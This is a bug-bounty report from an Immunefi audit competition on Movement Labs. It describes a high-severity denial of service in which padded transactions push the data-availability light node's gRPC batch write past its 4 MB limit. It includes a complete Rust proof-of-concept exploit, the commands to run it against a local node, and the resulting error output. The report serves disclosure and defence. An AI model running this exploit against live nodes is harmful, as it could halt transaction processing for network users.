# #42495 \[BC-High] The Tonic Request/Response Size Limit prevents data from being submitted to the da\_light\_node

**Submitted on Mar 24th 2025 at 10:25:38 UTC by @zhaojie for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #42495
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/da/movement/protocol/light-node>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

When the data size exceeds 4194304 bytes,`da_light_node_client.batch_write` failed. Data cannot be submitted to DA layer.\
An attacker who creates 30 invalid transactions will exceed this limit.

## Vulnerability Details

Because of the tonic request/response size limit, the `da_light_node_client.batch_write` function returns the following error when the submitted data size exceeds the limit:

```cmd
batch_write: Err(Status { code: OutOfRange, message: "Error, decoded message length too large: found 5838150 bytes, the limit is: 4194304 bytes", metadata: MetadataMap { headers: {"content-type": "application/grpc", "date": "Mon, 24 Mar 2025 09:42:14 GMT", "content-length": "0"} }, source: None })
```

This limit is easy to reach, aptos allows a single transaction size of up to 64kb,\
This limit is exceeded when the number of transactions is tested at 30.

Use the following code to add invalid data to the transaction:

```rust
let long_str = "a".repeat(1024 * 63);
```

The transactions created in this way in the test code can be processed, so the transactions are valid.

`transaction_pipe::submit_transaction` only verifies the validity of the transaction, it does not execute the transaction, and the transaction created by the attacker can pass the verification:

```rust
		let vm_validator = VMValidator::new(Arc::clone(&self.db_reader));
		let tx_result = vm_validator.validate_transaction(transaction.clone())?;
```

Therefore, when the size of the transaction data is close to 64kb and the number of concurrent transactions exceeds 30, the data will fail to be submitted.

transaction\_pipe::submit\_transaction does not return an error; the error occurs in transaction\_ingress.rs.

In the test code, a simulated transaction is created, and the batch\_write function is called by connecting the da light node directly.\
These transactions can also be submitted via aptos::rest\_client.

## Impact Details

The transaction cannot be processed due to a DoS attack,\
but the client still indicates that the transaction was submitted successfully.

## References

<https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/networks/movement/movement-full-node/src/node/tasks/transaction\\_ingress.rs#L111>

## Proof of Concept

## Proof of Concept

Place the test code in the following file:\
networks/movement/movement-client/src/bin/e2e/da\_batch\_write.rs

```rust
use anyhow::Context;
use movement_client::{
	crypto::ed25519::Ed25519PrivateKey,
	types::account_config::aptos_test_root_address,
	// types::LocalAccount,
	//types::chain_id::ChainId,
};

use once_cell::sync::Lazy;
use std::str::FromStr;
use url::Url;
use bcs::to_bytes;
use std::time::SystemTime;
use std::time::UNIX_EPOCH;

use movement_client::{
	coin_client::CoinClient,
	move_types::{
		identifier::Identifier,
		language_storage::{ModuleId, TypeTag},
	},
	rest_client::{Client, FaucetClient},
	transaction_builder::TransactionBuilder,
	types::transaction::{EntryFunction, SignedTransaction, TransactionPayload},
	types::{account_address::AccountAddress, chain_id::ChainId, LocalAccount},
};


use movement_da_light_node_proto::{BatchWriteRequest, BlobWrite};
use prost::Message;


static SUZUKA_CONFIG: Lazy<movement_config::Config> = Lazy::new(|| {
	let dot_movement = dot_movement::DotMovement::try_from_env().unwrap();
	let config = dot_movement.try_get_config_from_json::<movement_config::Config>().unwrap();
	config
});

// :!:>section_1c
static NODE_URL: Lazy<Url> = Lazy::new(|| {
	let node_connection_address = SUZUKA_CONFIG
		.execution_config
		.maptos_config
		.client
		.maptos_rest_connection_hostname
		.clone();
	let node_connection_port = SUZUKA_CONFIG
		.execution_config
		.maptos_config
		.client
		.maptos_rest_connection_port
		.clone();

	let node_connection_url =
		format!("http://{}:{}", node_connection_address, node_connection_port);

	Url::from_str(node_connection_url.as_str()).unwrap()
});


pub async fn create_fake_signed_transaction(
	chain_id: u8,
	from_account: &LocalAccount,
	to_account: AccountAddress,
	amount: u64,
	sequence_number: u64,
) -> Result<SignedTransaction, anyhow::Error> {
	let coin_type = "0x1::aptos_coin::AptosCoin";
	let timeout_secs = 600; // 10 minutes
	let max_gas_amount = 5_000;
	let gas_unit_price = 100;

	let expiration_time =
		SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() + timeout_secs;

	let long_str = "a".repeat(1024 * 63);

	let transaction_builder = TransactionBuilder::new(
		TransactionPayload::EntryFunction(EntryFunction::new(
			ModuleId::new(AccountAddress::ONE, Identifier::new("coin").unwrap()),
			Identifier::new("transfer")?,
			vec![TypeTag::from_str(coin_type)?],
			vec![to_bytes(&to_account)?, to_bytes(&amount)?, to_bytes(&long_str)?],
		)),
		expiration_time,
		ChainId::new(chain_id),
	);

	let raw_transaction = transaction_builder
		.sender(from_account.address())
		.sequence_number(sequence_number)
		.max_gas_amount(max_gas_amount)
		.gas_unit_price(gas_unit_price)
		.expiration_timestamp_secs(expiration_time)
		.chain_id(ChainId::new(chain_id))
		.build();

	let signed_transaction = from_account.sign_transaction(raw_transaction);

	Ok(signed_transaction)
}

use movement_da_light_node_client::MovementDaLightNodeClient;

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let mut client = MovementDaLightNodeClient::try_http2(&"http://127.0.0.1:30730".to_string()).await?;

	let raw_private_key = SUZUKA_CONFIG
		.execution_config
		.maptos_config
		.chain
		.maptos_private_key_signer_identifier
		.try_raw_private_key()?;
	let private_key = Ed25519PrivateKey::try_from(raw_private_key.as_slice())?;
	let mut genesis = LocalAccount::new(aptos_test_root_address(), private_key, 0);
	let target_address = AccountAddress::from_hex_literal(
		// "0x55f97e3f24410c4f3874c469b525c4076aaf02b8fee3c604a349a9fd9c947bc0",
		"0x02",
	)?;

	let mut transactions = vec![];

	let transaction = create_fake_signed_transaction(
		126,
		&genesis,
		target_address,
		100_000_000,
		0,
	)
	.await?;

	for num in 1..=30 {
        // The same processing is used in transaction_ingress::spawn_write_next_transaction_batch.
        let serialized_aptos_transaction = bcs::to_bytes(&transaction)?;
        let movement_transaction = movement_types::transaction::Transaction::new(
            serialized_aptos_transaction,
            0,
            transaction.sequence_number(),
        );
        let serialized_transaction = serde_json::to_vec(&movement_transaction)?;
        transactions.push(BlobWrite { data: serialized_transaction });
	}

    let batch_write = BatchWriteRequest { blobs: transactions };
    let mut buf = Vec::new();
    batch_write.encode_raw(&mut buf);
    println!("batch_write size: {}", buf.len());

    let res = client.batch_write(batch_write).await;
    
    println!("batch_write: {:?}",res);

    Ok(())
}

```

Adding dependencies and \[bin] in:\
networks/movement/movement-client/Cargo.toml

```rust
[[bin]]
name = "movement-da-batch-write"
path = "src/bin/e2e/da_batch_write.rs"

prost = { workspace = true }
```

To run the da light node server at 127.0.0.1:30730 :

```cmd
cargo run --bin movement-celestia-da-light-node run
```

Run tests:

```cmd
cargo run --bin movement-da-batch-write run
```

Console output:

```cmd
batch_write: Err(Status { code: OutOfRange, message: "Error, decoded message length too large: found 5838150 bytes, the limit is: 4194304 bytes", metadata: MetadataMap { headers: {"content-type": "application/grpc", "date": "Mon, 24 Mar 2025 09:42:14 GMT", "content-length": "0"} }, source: None })
```
